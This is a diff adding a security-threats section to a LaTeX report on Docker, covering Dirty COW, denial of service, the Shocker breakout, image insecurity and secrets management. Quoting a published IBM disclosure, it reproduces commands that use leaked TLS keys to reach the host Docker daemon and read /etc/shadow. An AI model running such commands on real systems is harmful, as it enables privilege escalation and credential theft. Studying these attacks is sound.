@@ -8,6 +8,14 @@
 % command \url{...} to create URL with hyperlink)
 %
 \usepackage{color}
+\usepackage{listings}
+\lstset{
+    tabsize=2, % tab space width
+    showstringspaces=false, % don't mark spaces in strings
+    commentstyle=\color{green}, % comment color
+    keywordstyle=\color{blue}, % keyword color
+    stringstyle=\color{red} % string color
+}
 \usepackage[a4paper,colorlinks=true,urlcolor=blue,citecolor=blue,linkcolor=blue,bookmarks=false]{hyperref}
 %
 % This allows inclusion of pictures. Create figures with PowerPoint and then
@@ -86,7 +94,7 @@ the development cycle and the possibility to thicken applications on servers.
 limelight thanks to its simple interface, which allows to create and manage
 containers in an easy way. 
 
-\subsection{From virtual machines...}
+\subsection{From Virtual Machines...}
 
 With the term virtual machines it is often intended an \textit{hypervisor-based
 virtualisation}, that is a type of virtualisation that acts at hardware level.
@@ -114,7 +122,7 @@ referring to containers.
   \end{figure}
 
 
-\subsection{...to containers}
+\subsection{...To Containers}
 
 \textit{Container-based virtualisation} represents another approach to
 virtualisation, mainly spread in the last years. Compared to hypervisor-based
@@ -161,7 +169,7 @@ following subsections these two components will be analysed, both for their
 importance for containerisation and for the fact that they are also the basic
 components in Docker.
 
-\subsubsection{Kernel namespace}
+\subsubsection{Kernel Namespace}
 
 \textit{Namespaces} allow to create isolated environments, in which each process
 that belongs to that particular environment can see global host's resources as
@@ -297,7 +305,7 @@ Wikipedia\cite{docker_history_wiki}:
 
 \end{itemize}   
 
-\subsubsection{Docker's architecture}
+\subsubsection{Docker's Architecture}
 
 \textit{Docker} follows a client-server architecture, where three main
 components can be distinguished (\myfig{\ref{fig:docker-architecture}}):
@@ -316,7 +324,8 @@ components can be distinguished (\myfig{\ref{fig:docker-architecture}}):
   \label{fig:docker-architecture}
   \end{figure}
 
-\subsubsection{Docker's objects}
+\subsubsection{Docker's Objects}
+\label{sec:docker_object}
 
 Docker's workflow includes the interaction with many special purpose objects,
 created and managed by \textbf{containerd}:
@@ -366,11 +375,228 @@ created and managed by \textbf{containerd}:
 
 \newpage
 
-\section{Docker's security threats}
+\section{Docker's Security Threats}
+
+\cite{mitigating_docker_security_issues_yasrab}
+
+\cite{sysdig_docker_vulnerabilities}
+
+\subsubsection{Kernel Exploits}
+
+One of the main advantages of container-based virtualisation, and so of Docker,
+is that the host shares its kernel with all the running containers. In this way
+this kind of virtualisation results lighter than an hypervisor-based one,
+avoiding the overhead of installing the guest's kernel. As we will see this is
+on the one hand a big advantage in terms of speed and efficiency, but on the
+other hand it represents a big threat for the security of the system. The host's
+kernel, indeed, handles all the containers' operations, so in case of a
+\textit{kernel-level exploit} all the containers that are running on the system
+are at risk of being compromised.\par Kernel exploits can be done by an attacker
+who takes advantages of a bug or a vulnerability of the kernel. In this way he
+can run his software in kernel mode, manipulating processes' privileges, that
+can bring him to take control of the system. If such exploit is performed inside
+a container, it has consequences also on the host OS. In particular if the
+attack allows the attacker to execute his code, this execution will happen on
+the host OS, not inside the container; in the same way if the attack allows to
+read arbitrary memory, so the attacker could read and write memory parts that
+belong to other containers.\par Kernel exploits are also a security threat in
+the context of an hypervisor-based virtualisation, but in this case the attack
+would result more complicated. Indeed the attacker should be able to exploit the
+VM's kernel, the hypervisor and the host's kernel. While on a container-based
+virtualisation it is sufficient to exploit the only host's kernel.
+
+\bigbreak\textbf{Practical Example}\bigbreak 
+
+In literature there many examples of kernel exploits used to obtain control over
+an entire system. In this section we will focus on \textit{Dirty COW}, an attack
+that takes advantage of a privilege-related vulnerability in order to allow the
+attacker to gain high privileges on the system. The official reference to this
+bug is CVE-2016-5195.\par It exploits a race condition inside the Linux kernel's
+memory subsystem that handles the copy-on-write (COW) mechanism, in this way an
+unprivileged user could gain write access to a read-only memory
+part\cite{red_hat_dirtycow}.\par In order to obtain this exploit, we must create
+a loop involving two threads:
+\begin{itemize}
+  \item one thread tries to access inside a read-only memory location to
+  write, creating in this way a modified copy inside the process's memory
+  \item another thread, calls the syscall
+  \textit{madvise()}\cite{madvise_description} with the MADV\_DONTNEED parameter
+  (such parameter indicates that is not to be expected to access the memory
+  location in question) for the newly allocated memory
+  \end{itemize}
+The simultaneous execution of these two threads in a loop could bring the
+kernel to point to the modified copy of a file in memory that should instead be
+read-only\cite{dirtycow_how_it_worrks}
+
+\subsubsection{Denial-of-service}
+
+As we have seen for kernel exploits, the fact that all the containers running on
+a host share the same kernel can be positive and negative at the same time. All
+the containers, indeed, share also the same resources and if the access to them
+is not limited in some way one container could require a huge amount just for
+it, bringing the host and the other containers to starvation. This type of
+attack is known as \textit{denial-of-service(DoS)}.\par Denial-of-service
+attacks are very well-known attacks in literature, especially in multi-tenant
+systems, that are the ones where Docker is mostly used.  The aim of the attack
+is to make a system or a network resource unavailable. It is typically
+accomplished by flooding the targeted machine or resource with superfluous
+requests in an attempt to overload systems and prevent some or all legitimate
+requests from being fulfilled\cite{dos_wikipedia}. An attack of this genre,
+conducted against a Docker container, brings to unavailability not only the
+container itself, but also the host where it is virtualised together with all
+the other system's containers.\par On a virtual machine this type of attack is
+also possible, but it is more difficult to be completed. This is due to the fact
+that the hypervisor is configured to restrict its use of resources. For a
+container, instead, resources management is defined at application layer.\par
+In the previous section we have seen how Docker has inherited Cgroups from LXC
+to allocate containers' resources. However, as described on Docker's
+documentation\cite{resource_on_docker}, this kernel tool is not enabled by
+default, so a container can use as much of a given resource as the host's kernel
+scheduler allows. We will see in the next section how to configure Docker to
+work with Cgroups, managing resources for containers. 
+
+\bigbreak\textbf{Practical Example}\bigbreak 
+
+\subsubsection{Container Breakout}
+
+If a user inside a Docker container bypasses all the isolation checks,
+"escaping" from the container, it would have direct access to the host and to
+all the other containers in the system. This situation can be achieved using an
+exploit or a not correct configuration of the Docker environment. Such type of
+attack is known as \textit{container breakout}.\par This type of vulnerability,
+according to Docker website\cite{docker_blog_about_container_breakout}, was
+fixed in Docker 1.0, nevertheless an not trusted program running with root
+privileges inside a Docker container could still represent a source of risk.
+\par Container breakout was mostly possible in situations where privileges
+inside a container were not properly configured. By default, users are not
+namespaced, so any process that breaks out of the container will have the same
+privileges on the host as it did in the container. A root user in a container
+will also be root on the host. Moreover, in the earliest versions of the Docker
+engine, some specific kernel capabilities were dropped, but still leaving some
+important ones granted. From Docker 1.0, instead, a different approach was
+taken: all the capabilities were dropped, giving the user the possibility to
+decide which one to allow. De facto this newly approach transformed the use of
+capabilities from a blacklist to a white-list.
+
+\bigbreak\textbf{Practical Example}\bigbreak 
+
+One of the most famous container breakout exploit is 2014's
+\textit{Shocker}\cite{shocker}. In this section we will analyse such attack,
+which has the aim to demonstrates how a Docker container could access some
+privileged file-system data. As said before, this kind of vulnerability was
+fixed with Docker 1.0, but it could still be interesting to understand how this
+type of attack worked\cite{shocker_how_it_works}.\par Shocker takes advantage of
+the \textit{CAP\_DAC\_READ\_SEARCH} capability, that was granted by default to a
+superuser inside a Docker container. This capability is the one which allows to
+use the system call \textit{open\_by\_handle\_at()}, conceding to access a file
+on a mounted file-system through a file\_handle structure. A file\_handle is
+quite different than a file descriptor, because it can be generated inside a
+process using \textit{name\_to\_handle\_at()} and then recalled by another
+process with \textit{open\_by\_handle\_at()} (while a file descriptor can't be
+properly passed between different processes). In this way if a process has an
+handle opened for a host's file or a different container's and our container has
+not the privileges to access it, we can still call
+\textit{open\_by\_handle\_at()} on the opened handle.
+
+\subsubsection{Images Insecurity}
+
+As said in \ref{sec:docker_object}, Docker images represent one of the most
+fundamental building blocks for a container. If an attacker could obtain to make
+his images to run, the host and all its containers are seriously at risk. In the
+same way it is important to make sure that the running images are updated, not
+containing any known vulnerability.\par Container images are claimed to be
+downloaded and verified by default by the system, thanks to the presence of a
+signed manifest inside the image. In such mechanism however Docker does not
+verify the image's checksum from the manifest. In this way an attacker could
+provide his images infected with some virus, together with a signed manifest,
+tricking Docker verification and leading to many vulnerabilities the user's
+system. \par Jonathan Rudenberg explained, in a
+post\cite{docker_image_insecurity} on his blog, how the process of downloading a
+Docker image from the Docker Hub is extremely insecure. Such images are
+downloaded from an HTTPS server and then they immediately go through a
+processing pipeline inside the Docker daemon: \bigbreak\centerline{decompress
+$\,\to\,$ tarsum $\,\to\,$ unpack}\bigbreak This pipeline, even if it is
+functional, is insecure. The reason lies in the fact that the not trusted input
+is processed before its verification. 
+
+\bigbreak\textbf{Practical Example}\bigbreak 
+
+CVE-2014-9357\cite{CVE-2014-9357} is a known vulnerability that allowed remote
+attackers to execute arbitrary code with root privileges via a crafted image or
+build in a Dockerfile in an LZMA (.xz) archive, related to the chroot for
+archive extraction.\par This vulnerability exploited the way the Docker service
+unpacked images or builds after a "docker pull". In such a way an attacker could
+use this flaw to provide a malicious image or build that, when unpacked, would
+escalate their privileges on the system.
+
+\subsubsection{Management Of Secrets}
+
+Docker containers are very used in the development of microservices. A
+microservice architecture is very different than a monolithic one, specially in
+the deployment phase: a monolithic architecture is often just configured,
+launched and then it runs for a long period of time (which could even last
+years); microservices are continuously created and destroyed. In both cases,
+sensitive information are needed, like API keys, database passwords, SSL/TLS
+keys, SSH keys, etc... Compromising these information would compromise the
+entire system. \par In a monolithic architecture the management of these
+information's is non trivial, having them stored in the system permanently with
+mechanisms for their renovation, like the "Privileged Accounts
+Managers"\cite{privileged_accounts_managers}. Despite these solutions have been
+used and tested for years in the context of monolithic service, they can't be
+applied to microservices based on containers. The two main concerns for the
+management of secrets inside Docker containers
+are\cite{secret_management_concerns_docker}:
+\begin{itemize}
+  \item Docker images have an immutable nature, this means that they are created
+  once and then deployed in many different environments. Their nature is
+  strongly in contrast with the idea of saving secrets directly inside them.  
+  \item Requesting such secrets at runtime imply performing a prior
+  authentication procedure, but this procedure is difficult to be implemented
+  without storing some secrets for the authentications itself.
+\end{itemize}
+\par In the case of Docker, a security breach inside a single container could
+lead to the breakdown of all the other containers running on the same host. For
+this reason \textit{management of secrets} should be seen as an important threat
+for Docker containers' security.
+
+\bigbreak\textbf{Practical Example}\bigbreak 
+
+One example of how a bad management of secrets could be fatal for an agency
+comes from IBM. In 2017 a privilege escalation vulnerability was found inside
+IBM Data Science Experience, a data analytics
+product\cite{ibm_data_science_experience}. Such vulnerability was due to a wrong
+configuration of the Docker containers that were running the service. IBM's
+engineers left inside the containers Docker TLS keys, leaving root access across
+the whole computer cluster and read/write access many terabytes of sensible
+customer data. \par As stated by the report of the
+vulnerability\cite{ibm_data_sciene_report}, an exploit of such threat was also
+quite easy, needing only an access to to Internet and a web browser:
+\begin{itemize}
+  \item The attacker should just enter the service's web environment, accessing
+  to its command line
+  \item He should download and extract the Docker binary of the service, using
+  the following commands: 
+  \begin{lstlisting}[language=bash,breaklines]
+    system("wget https://test.docker.com/builds/Linux/x86_64/docker-1.13.1-rc1.tgz")
+    system("wget https://test.docker.com/builds/Linux/x86_64/docker-1.13.1-rc1.tgz")
+  \end{lstlisting}
+  \item Use the downloaded Docker binary with the existing certificates to
+  achieve root access to the host mounted volume:
+  \begin{lstlisting}[language=bash,breaklines]
+    system("DOCKER_API_VERSION=1.22 ./docker/docker -H 172.17.0.1 \
+              --tlscacert /certs/ca.pem --tlscert /certs/cert.pem \
+              --tlskey /certs/key.pem \
+              run -v /:/host debian cat /host/etc/shadow")
+  \end{lstlisting}
+\end{itemize} 
 
 \newpage
 
-\section{Best practices for Docker deployment}
+\section{Best Practices For Docker Deployment}
+
+\newpage
+
+\section{Experimental Evaluation}
 
 \newpage
 
@@ -417,6 +643,59 @@ Docker architecture,\\ \url{https://docs.docker.com/engine/docker-overview/#dock
 
 \bibitem{docker_objects}
 Docker objects,\\ \url{https://docs.docker.com/engine/docker-overview/#docker-objects}
+
+\bibitem{mitigating_docker_security_issues_yasrab}
+Robail Yasrab,
+``Mitigating Docker Security Issues'',
+April 2018
+
+\bibitem{sysdig_docker_vulnerabilities}
+Seven Docker security vulnerabilities and threats,\\ \url{https://sysdig.com/blog/7-docker-security-vulnerabilities/}
+
+\bibitem{red_hat_dirtycow}
+CVE-2016-5195,\\ \url{https://access.redhat.com/security/cve/cve-2016-5195} 
+
+\bibitem{madvise_description}
+MADVISE (2), \\ \url{http://man7.org/linux/man-pages/man2/madvise.2.html}
+
+\bibitem{dirtycow_how_it_worrks}
+Demonstrating the Dirty Cow exploit, \\ \url{https://01.org/developerjourney/recipe/demonstrating-dirty-cow-exploit}
+
+\bibitem{dos_wikipedia}
+Denial-of-service attack, \\
+\url{https://en.wikipedia.org/wiki/Denial-of-service_attack}
+
+\bibitem{resource_on_docker} 
+Limit a container's resources, \\ \url{https://docs.docker.com/config/containers/resource_constraints/}
+
+\bibitem{docker_blog_about_container_breakout}
+Docker Container Breakout Proof-of-Concept Exploit, \\ \url{https://blog.docker.com/2014/06/docker-container-breakout-proof-of-concept-exploit/}
+
+\bibitem{shocker}
+Shocker, \\ \url{https://github.com/gabrtv/shocker}
+
+\bibitem{shocker_how_it_works}
+Docker breakout exploit analysis, \\ \url{https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3}
+
+\bibitem{docker_image_insecurity}
+Docker Image Insecurity, \\ \url{https://titanous.com/posts/docker-insecurity}
+
+\bibitem{CVE-2014-9357}
+CVE-2014-9357, \\ \url{https://access.redhat.com/security/cve/cve-2014-9357}
+
+\bibitem{privileged_accounts_managers}
+What is Privileged Account Management?, \\ \url{https://www.coresecurity.com/blog/what-is-privileged-account-management}
+
+\bibitem{secret_management_concerns_docker}
+Secret management using Docker containers, \\ \url{https://www.bbva.com/en/docker/}
+
+\bibitem{ibm_data_science_experience}
+IBM Data Science Experience, \\ \url{https://datascience.ibm.com/}
+
+\bibitem{ibm_data_sciene_report}
+IBM Data Science Experience: Whole-Cluster Privilege Escalation Disclosure. \\ \url{https://wycd.net/posts/2017-02-21-ibm-whole-cluster-privilege-escalation-disclosure.html}
+
+
 
 \end{thebibliography}
 
